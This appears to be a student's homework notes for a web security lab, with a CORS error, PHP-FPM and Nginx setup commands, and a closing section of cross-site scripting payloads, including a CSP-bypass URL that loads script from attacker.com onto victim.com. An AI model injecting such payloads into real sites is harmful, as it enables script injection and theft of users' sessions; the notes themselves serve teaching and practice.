##

###
https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement

### Task 1
sudo cp -t /var/www/cookie-research/html/ ./06_homework/t1.html

Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://victim.com/test.txt. (Reason: CORS header ‘Access-Control-Allow-Origin’ missing). Status code: 404.

### Php installation and Nginx integration
apt search php*-fpm
sudo apt install php-fpm
systemctl status php8.1-fpm.service 
sudo nano /etc/nginx/sites-available/default
sudo nginx -t
sudo systemctl restart nginx
sudo nano /var/www/html/info.php

### 
victim.com/csp.php?js=<script/src=//attacker.com/evil.js></script>
attacker.com/csp.php?js=<script/src=//attacker.com/evil.js></script>

###
http://victim.com/hw-6-3.php?name=<script>alert("hacked")</script>

